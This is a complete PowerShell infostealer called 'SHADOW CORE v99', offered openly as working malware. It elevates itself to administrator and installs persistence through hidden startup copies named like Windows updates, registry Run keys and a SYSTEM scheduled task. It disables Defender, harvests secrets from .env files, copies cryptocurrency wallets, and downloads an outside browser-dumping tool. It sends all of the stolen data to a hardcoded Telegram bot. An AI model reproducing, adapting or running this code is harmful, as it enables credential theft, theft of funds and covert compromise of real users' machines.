#Requires -Version 5.1
# ============================================================
# SHADOW CORE v99 - .ENV FILE EXFILTRATOR (POWERSHELL)
# - Finds all .env files
# - Extracts secrets
# - Sends to Telegram
# - Full persistence
# ============================================================

$ErrorActionPreference = 'SilentlyContinue'

# ==================== CONFIGURATION ====================
$BOT_TOKEN = "8421766867:AAF_3BKKFiBoIhaV5PL8YuX1p46Wn-7eUq8"
$CHAT_ID = "7361517001"

if ($MyInvocation.MyCommand.Path) {
    $SCRIPT_PATH = $MyInvocation.MyCommand.Path
} else {
    $SCRIPT_PATH = $env:AppData + "\Microsoft\Windows\Update\shadow_core.ps1"
}

$TEMP_DIR = "$env:ProgramData\Microsoft\Windows\Update\data"
$DATA_DIR = "$TEMP_DIR\extracted_data"
$BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"

# ==================== AUTO-ELEVATION ====================
function Test-Admin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Elevate-Admin {
    if (-not (Test-Admin)) {
        $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SCRIPT_PATH`""
        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
        exit
    }
}
Elevate-Admin

# ==================== CREATE DIRECTORIES ====================
New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
New-Item -ItemType Directory -Force -Path $DATA_DIR | Out-Null

# ==================== PERSISTENCE ====================
function Add-ToStartup {
    Write-Host "[*] Deploying persistence..."
    $success = 0
    $total = 0
    
    # User Startup Folder
    $total++
    try {
        $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $dest = "$startup\WindowsUpdate.exe"
        if (-not (Test-Path $dest)) {
            Copy-Item $SCRIPT_PATH $dest -Force
            attrib +h $dest
            Write-Host "[+] User Startup: $dest"
            $success++
        }
    } catch {}
    
    # System Startup Folder
    $total++
    try {
        $startup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        $dest = "$startup\SystemMaintenance.exe"
        if (-not (Test-Path $dest)) {
            Copy-Item $SCRIPT_PATH $dest -Force
            attrib +h $dest
            Write-Host "[+] System Startup: $dest"
            $success++
        }
    } catch {}
    
    # HKCU Registry
    $total++
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCore" -Value "`"$SCRIPT_PATH`"" -Force
        Write-Host "[+] HKCU Registry: ShadowCore"
        $success++
    } catch {}
    
    # HKLM Registry
    $total++
    try {
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCoreSystem" -Value "`"$SCRIPT_PATH`"" -Force
        Write-Host "[+] HKLM Registry: ShadowCoreSystem"
        $success++
    } catch {}
    
    # Scheduled Task
    $total++
    try {
        $taskName = "ShadowCoreGrabber"
        schtasks /create /tn "$taskName" /tr "`"$SCRIPT_PATH`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
        Write-Host "[+] Scheduled Task: $taskName"
        $success++
    } catch {}
    
    Write-Host "[*] Persistence: $success/$total methods deployed"
}

# ==================== TELEGRAM FUNCTIONS ====================
function Send-TelegramMessage {
    param([string]$Text)
    try {
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        $body = @{ chat_id = $CHAT_ID; text = $Text.Substring(0, [Math]::Min($Text.Length, 4000)) } | ConvertTo-Json
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
    } catch {}
}

function Send-TelegramFile {
    param([string]$FilePath)
    try {
        if (-not (Test-Path $FilePath)) { return $false }
        $fileSize = (Get-Item $FilePath).Length / 1MB
        if ($fileSize -gt 45) { return $false }
        
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = Split-Path $FilePath -Leaf
        
        $part1 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$CHAT_ID`r`n")
        $part2 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        
        $body = New-Object System.Collections.ArrayList
        $body.AddRange($part1)
        $body.AddRange($part2)
        $body.AddRange($fileBytes)
        $body.AddRange($footer)
        $bodyBytes = $body.ToArray()
        
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 60 -EA Stop
        return $true
    } catch { return $false }
}

function Send-TelegramSummary {
    param([string]$DataSummary, [int]$Sent, [int]$Failed)
    try {
        $hostname = $env:COMPUTERNAME
        $username = $env:USERNAME
        $osInfo = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        $summary = @"
📊 SHADOW CORE v99 - EXFILTRATION COMPLETE

💻 Host: $hostname
👤 Current User: $username
🖥 OS: $osInfo
⏰ Time: $timestamp

📁 Data Collected:
$DataSummary

📤 Sent: $Sent
❌ Failed: $Failed
"@
        Send-TelegramMessage -Text $summary
    } catch {}
}

# ==================== GET ALL USERS ====================
function Get-AllUsers {
    $users = @()
    $systemDrive = $env:SystemDrive
    
    # Method 1: Users folder
    $usersPath = "$systemDrive\Users"
    if (Test-Path $usersPath) {
        Get-ChildItem $usersPath -Directory | ForEach-Object {
            $user = $_.Name
            $skipUsers = @('Public', 'Default', 'Default User', 'All Users', 'ADMIN$', 'Default.migrated')
            if ($user -notin $skipUsers -and -not $user.StartsWith('.')) {
                $userPath = $_.FullName
                $desktop = "$userPath\Desktop"
                $docs = "$userPath\Documents"
                if ((Test-Path $desktop) -or (Test-Path $docs)) {
                    $users += [PSCustomObject]@{
                        username = $user
                        path = $userPath
                        desktop = $(if (Test-Path $desktop) { $desktop } else { $null })
                        documents = $(if (Test-Path $docs) { $docs } else { $null })
                        downloads = $(if (Test-Path "$userPath\Downloads") { "$userPath\Downloads" } else { $null })
                        appdata = "$userPath\AppData"
                        roaming = "$userPath\AppData\Roaming"
                        localappdata = "$userPath\AppData\Local"
                    }
                    Write-Host "    [+] Found user: $user"
                }
            }
        }
    }
    
    # Fallback: current user
    if ($users.Count -eq 0) {
        $currentUser = $env:USERNAME
        $userPath = "$systemDrive\Users\$currentUser"
        if (Test-Path $userPath) {
            $users += [PSCustomObject]@{
                username = $currentUser
                path = $userPath
                desktop = $(if (Test-Path "$userPath\Desktop") { "$userPath\Desktop" } else { $null })
                documents = $(if (Test-Path "$userPath\Documents") { "$userPath\Documents" } else { $null })
                downloads = $(if (Test-Path "$userPath\Downloads") { "$userPath\Downloads" } else { $null })
                appdata = "$userPath\AppData"
                roaming = "$userPath\AppData\Roaming"
                localappdata = "$userPath\AppData\Local"
            }
            Write-Host "    [+] Added current user: $currentUser"
        }
    }
    
    return $users
}

# ==================== .ENV SCANNER ====================
function Scan-EnvFiles {
    param($Users)
    Write-Host "`n" + "=" * 80
    Write-Host "🔍 .ENV FILE SCANNER"
    Write-Host "=" * 80
    
    $foundFiles = @()
    
    foreach ($user in $Users) {
        $userName = $user.username
        Write-Host "[*] Scanning user: $userName"
        
        $dirsToScan = @(
            $user.path,
            $user.desktop,
            $user.documents,
            $user.downloads,
            $user.roaming,
            $user.localappdata
        ) | Where-Object { $_ -and (Test-Path $_) }
        
        foreach ($scanDir in $dirsToScan) {
            Write-Host "    Scanning: $scanDir"
            Get-ChildItem -Path $scanDir -Recurse -File -EA SilentlyContinue | ForEach-Object {
                $file = $_.Name
                $fileLower = $file.ToLower()
                if ($fileLower -eq '.env' -or $fileLower.StartsWith('.env') -or $fileLower.EndsWith('.env') -or $fileLower.Contains('.env.')) {
                    $filePath = $_.FullName
                    if ($_.Length -gt 0) {
                        $foundFiles += [PSCustomObject]@{
                            Path = $filePath
                            Name = $file
                            Size = $_.Length
                            User = $userName
                            Directory = $_.DirectoryName
                        }
                        Write-Host "        ✅ Found: $filePath"
                    }
                }
            }
        }
    }
    
    Write-Host "`n[+] Found $($foundFiles.Count) .env files"
    return $foundFiles
}

# ==================== EXTRACT SECRETS ====================
function Extract-Secrets {
    param($EnvFiles)
    Write-Host "`n" + "=" * 80
    Write-Host "🔑 EXTRACTING SECRETS FROM .ENV FILES"
    Write-Host "=" * 80
    
    $patterns = @(
        @{Name='AWS_Key'; Pattern='AKIA[0-9A-Z]{16}'},
        @{Name='AWS_Secret'; Pattern='AWS_SECRET[=:]\s*[A-Za-z0-9/+=]+'},
        @{Name='Google_API'; Pattern='AIza[0-9A-Za-z\-_]{35}'},
        @{Name='GitHub_Token'; Pattern='ghp_[0-9A-Za-z]{36}'},
        @{Name='Slack_Token'; Pattern='xox[baprs]-[0-9A-Za-z\-]+'},
        @{Name='Discord_Bot'; Pattern='[A-Za-z0-9\-_]{24}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}'},
        @{Name='Stripe_Key'; Pattern='sk_live_[0-9A-Za-z]{24}'},
        @{Name='JWT_Token'; Pattern='eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'},
        @{Name='Bearer_Token'; Pattern='Bearer [A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'},
        @{Name='API_Key'; Pattern='API[_-]?KEY[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Secret_Key'; Pattern='SECRET[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Token'; Pattern='TOKEN[=:]\s*[A-Za-z0-9\-_]{16,}'},
        @{Name='Password'; Pattern='PASSWORD[=:]\s*[A-Za-z0-9!@#$%^&*()\-_]{8,}'},
        @{Name='Mongo_URI'; Pattern='mongodb://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='MySQL_URI'; Pattern='mysql://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='Postgres_URI'; Pattern='postgresql://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='Redis_URI'; Pattern='redis://[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='DB_URL'; Pattern='DATABASE_URL[=:]\s*[A-Za-z0-9@:%._\+~#=]{8,}'},
        @{Name='DB_USER'; Pattern='DB_USER[=:]\s*[A-Za-z0-9\-_]{3,}'},
        @{Name='DB_PASS'; Pattern='DB_PASS[=:]\s*[A-Za-z0-9!@#$%^&*()\-_]{3,}'},
        @{Name='API_URL'; Pattern='API_URL[=:]\s*https?://[A-Za-z0-9\-_.]+'},
        @{Name='CLIENT_ID'; Pattern='CLIENT_ID[=:]\s*[A-Za-z0-9\-_.]+'},
        @{Name='CLIENT_SECRET'; Pattern='CLIENT_SECRET[=:]\s*[A-Za-z0-9\-_.]+'}
    )
    
    $secretsFile = "$DATA_DIR\secrets_from_env.txt"
    $foundSecrets = 0
    
    foreach ($envFile in $EnvFiles) {
        $filePath = $envFile.Path
        if (-not (Test-Path $filePath)) { continue }
        
        try {
            $content = Get-Content $filePath -Raw -Encoding UTF8 -EA SilentlyContinue
            $lines = $content -split "`n"
            $secretsInFile = @()
            
            foreach ($line in $lines) {
                $line = $line.Trim()
                if (-not $line -or $line.StartsWith('#')) { continue }
                if ($line -notmatch '=') { continue }
                
                $parts = $line -split '=', 2
                $key = $parts[0].Trim()
                $value = $parts[1].Trim()
                
                foreach ($pattern in $patterns) {
                    if ($line -match $pattern.Pattern) {
                        $display = "$key=$value"
                        if ($display.Length -gt 60) { $display = $display.Substring(0, 60) + "..." }
                        $secretsInFile += "$($pattern.Name): $display"
                        break
                    }
                }
            }
            
            if ($secretsInFile.Count -gt 0) {
                Add-Content -Path $secretsFile -Value "`n$('=' * 80)" -Encoding UTF8
                Add-Content -Path $secretsFile -Value "File: $filePath" -Encoding UTF8
                Add-Content -Path $secretsFile -Value "$('=' * 80)" -Encoding UTF8
                foreach ($secret in $secretsInFile[0..19]) {
                    Add-Content -Path $secretsFile -Value "  $secret" -Encoding UTF8
                }
                $foundSecrets += $secretsInFile.Count
                Write-Host "[+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)"
            }
        } catch {}
    }
    
    if ($foundSecrets -gt 0 -and (Test-Path $secretsFile)) {
        Write-Host "`n[+] Total secrets found: $foundSecrets"
        return $secretsFile
    }
    return $null
}

# ==================== WALLET EXTRACTION ====================
function Extract-Wallets {
    param($Users)
    Write-Host "`n" + "=" * 80
    Write-Host "💰 WALLET SCANNING"
    Write-Host "=" * 80
    
    $walletPatterns = @{
        'Bitcoin' = @('Roaming\Bitcoin\wallet.dat')
        'Ethereum' = @('Roaming\Ethereum\keystore\*.json')
        'Exodus' = @('Roaming\Exodus\*.dat')
        'Atomic' = @('Roaming\Atomic\*.dat')
        'Electrum' = @('Roaming\Electrum\wallets\*.dat')
        'Monero' = @('Roaming\monero\*.wallet')
        'Trust Wallet' = @('Roaming\Trust Wallet\*.dat')
    }
    
    $foundFiles = @()
    $walletDir = "$DATA_DIR\wallets"
    New-Item -ItemType Directory -Force -Path $walletDir | Out-Null
    
    foreach ($user in $Users) {
        $userName = $user.username
        $base = $user.roaming
        if (-not $base) { continue }
        
        foreach ($walletName in $walletPatterns.Keys) {
            $patterns = $walletPatterns[$walletName]
            foreach ($pattern in $patterns) {
                $fullPattern = "$base\$pattern"
                Get-ChildItem -Path $fullPattern -File -EA SilentlyContinue | ForEach-Object {
                    if ($_.Length -gt 0) {
                        $dest = "$walletDir\$userName\$walletName\$($_.Name)"
                        $destDir = Split-Path $dest -Parent
                        New-Item -ItemType Directory -Force -Path $destDir | Out-Null
                        Copy-Item $_.FullName $dest -Force
                        $foundFiles += $dest
                        Write-Host "[+] $walletName: $($_.Name)"
                    }
                }
            }
        }
    }
    
    Write-Host "`n📊 Total wallets found: $($foundFiles.Count)"
    return $foundFiles
}

# ==================== BROWSER DATA ====================
function Download-BrowserTool {
    $output = "$TEMP_DIR\hack-browser-data.exe"
    if (Test-Path $output) {
        try { attrib -r -h -s $output; Remove-Item $output -Force } catch {}
    }
    
    try {
        Write-Host "[*] Downloading hack-browser-data.exe..."
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($BROWSER_DATA_URL, $output)
        Write-Host "[+] Downloaded: $output"
        return $output
    } catch {
        Write-Host "[-] Download failed: $($_.Exception.Message)"
        return $null
    }
}

function Extract-BrowserData {
    param([string]$ExePath)
    Write-Host "`n" + "=" * 80
    Write-Host "🌐 BROWSER DATA EXTRACTION"
    Write-Host "=" * 80
    
    # Kill browser processes
    @('chrome.exe', 'msedge.exe', 'brave.exe', 'firefox.exe', 'opera.exe') | ForEach-Object {
        try { Stop-Process -Name $_.Replace('.exe', '') -Force -EA SilentlyContinue } catch {}
    }
    
    $browserDir = "$DATA_DIR\browser"
    New-Item -ItemType Directory -Force -Path $browserDir | Out-Null
    Push-Location $browserDir
    
    try {
        $process = Start-Process -FilePath $ExePath -ArgumentList "dump -b all -c all -d . -f json --zip" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$browserDir\output.log" -RedirectStandardError "$browserDir\error.log"
        
        $foundFiles = @()
        Get-ChildItem -Path $browserDir -Recurse -File | Where-Object { $_.Extension -match '\.(json|zip|csv)$' } | ForEach-Object {
            $foundFiles += $_.FullName
        }
        
        if ($foundFiles.Count -gt 0) {
            Write-Host "[+] Found $($foundFiles.Count) browser data files"
        }
        return $foundFiles
    } catch {}
    
    Pop-Location
    return @()
}

# ==================== SEND FILES ====================
function Send-FilesIndividually {
    param($FileList, $CategoryName = "Files")
    
    Write-Host "`n[*] Sending $($FileList.Count) $CategoryName files..."
    $sent = 0
    $failed = 0
    $i = 0
    
    foreach ($filePath in $FileList) {
        $i++
        if (-not (Test-Path $filePath)) { continue }
        
        try {
            $fileSize = (Get-Item $filePath).Length / 1MB
            if ($fileSize -gt 45) {
                Write-Host "    [$i/$($FileList.Count)] ⚠️ Skipping $(Split-Path $filePath -Leaf) - $([math]::Round($fileSize, 1))MB"
                $failed++
                continue
            }
            
            Write-Host "    [$i/$($FileList.Count)] 📤 Sending: $(Split-Path $filePath -Leaf) ($([math]::Round($fileSize, 2))MB)"
            if (Send-TelegramFile -FilePath $filePath) {
                $sent++
                Write-Host "        ✅ Sent"
            } else {
                $failed++
                Write-Host "        ❌ Failed to send"
            }
            Start-Sleep -Milliseconds 500
        } catch {
            $failed++
            Write-Host "    [$i/$($FileList.Count)] ❌ Error: $($_.Exception.Message)"
        }
    }
    
    return @{ Sent = $sent; Failed = $failed }
}

# ==================== MAIN ====================
function Main {
    Write-Host "=" * 80
    Write-Host "SHADOW CORE v99 - FINAL EXFILTRATOR"
    Write-Host "PS1: $SCRIPT_PATH"
    Write-Host "=" * 80
    Write-Host ""
    
    # Phase 0: Get users
    Write-Host "[PHASE 0] DETECTING ALL USERS"
    Write-Host "-" * 80
    $users = Get-AllUsers
    Write-Host "`n[*] Found $($users.Count) user profile(s):"
    foreach ($user in $users) { Write-Host "    - $($user.username)" }
    Write-Host ""
    
    # Phase 1: Persistence
    Write-Host "[PHASE 1] PERSISTENCE DEPLOYMENT"
    Write-Host "-" * 80
    Add-ToStartup
    Write-Host ""
    
    # Phase 2: Disable Defender
    Write-Host "[PHASE 2] DISABLING DEFENDER"
    Write-Host "-" * 80
    try {
        powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true" -EA SilentlyContinue
        powershell -Command "Add-MpPreference -ExclusionPath '$TEMP_DIR'" -EA SilentlyContinue
        powershell -Command "Add-MpPreference -ExclusionProcess 'shadow_core.ps1'" -EA SilentlyContinue
        Write-Host "[+] Defender disabled"
    } catch {}
    Write-Host ""
    
    $allFiles = @()
    $dataSummaryItems = @()
    $totalSent = 0
    $totalFailed = 0
    
    # Phase 3: .env scanning
    Write-Host "[PHASE 3] .ENV FILE SCANNING"
    Write-Host "-" * 80
    $envFiles = Scan-EnvFiles -Users $users
    $envFilePaths = @()
    
    if ($envFiles.Count -gt 0) {
        $envCopyDir = "$DATA_DIR\env_files"
        New-Item -ItemType Directory -Force -Path $envCopyDir | Out-Null
        
        foreach ($fileInfo in $envFiles) {
            try {
                $src = $fileInfo.Path
                if ($src -and (Test-Path $src)) {
                    $userName = $fileInfo.User
                    $userDir = "$envCopyDir\$userName"
                    New-Item -ItemType Directory -Force -Path $userDir | Out-Null
                    $dest = "$userDir\$(Split-Path $src -Leaf)"
                    Copy-Item $src $dest -Force
                    $envFilePaths += $dest
                    Write-Host "    [+] Copied: $(Split-Path $src -Leaf) ($userName)"
                }
            } catch {}
        }
        
        $dataSummaryItems += "📁 .env Files: $($envFilePaths.Count) files"
        
        $secretsFile = Extract-Secrets -EnvFiles $envFiles
        if ($secretsFile -and (Test-Path $secretsFile)) {
            $envFilePaths += $secretsFile
            $dataSummaryItems += "🔑 Secrets extracted"
        }
        
        if ($envFilePaths.Count -gt 0) {
            $result = Send-FilesIndividually -FileList $envFilePaths -CategoryName ".env"
            $totalSent += $result.Sent
            $totalFailed += $result.Failed
        }
    } else {
        Write-Host "[-] No .env files found"
    }
    Write-Host ""
    
    # Phase 4: Wallets
    Write-Host "[PHASE 4] WALLET SCANNING"
    Write-Host "-" * 80
    $walletFiles = Extract-Wallets -Users $users
    if ($walletFiles.Count -gt 0) {
        $dataSummaryItems += "💰 Wallets: $($walletFiles.Count) files"
        $result = Send-FilesIndividually -FileList $walletFiles -CategoryName "Wallet"
        $totalSent += $result.Sent
        $totalFailed += $result.Failed
    }
    Write-Host ""
    
    # Phase 5: Browser Data
    Write-Host "[PHASE 5] BROWSER DATA EXTRACTION"
    Write-Host "-" * 80
    $exePath = Download-BrowserTool
    if ($exePath) {
        $browserFiles = Extract-BrowserData -ExePath $exePath
        if ($browserFiles.Count -gt 0) {
            $dataSummaryItems += "🌐 Browser Data: $($browserFiles.Count) files"
            $result = Send-FilesIndividually -FileList $browserFiles -CategoryName "Browser"
            $totalSent += $result.Sent
            $totalFailed += $result.Failed
        }
    }
    Write-Host ""
    
    # Phase 6: Summary
    Write-Host "[PHASE 6] SENDING SUMMARY"
    Write-Host "-" * 80
    $summaryText = ($dataSummaryItems -join "`n") + "`n`n📤 Sent: $totalSent`n❌ Failed: $totalFailed"
    Send-TelegramSummary -DataSummary ($dataSummaryItems -join "`n") -Sent $totalSent -Failed $totalFailed
    
    Write-Host ""
    Write-Host "=" * 80
    Write-Host "EXFILTRATION COMPLETE"
    Write-Host "📤 Sent: $totalSent"
    Write-Host "❌ Failed: $totalFailed"
    Write-Host "=" * 80
    
    # Infinite loop for persistence
    while ($true) { Start-Sleep -Seconds 3600 }
}

# ==================== ENTRY POINT ====================
try {
    Main
} catch {
    Write-Host "[!] Error: $($_.Exception.Message)"
    Start-Sleep -Seconds 10
    Main
}
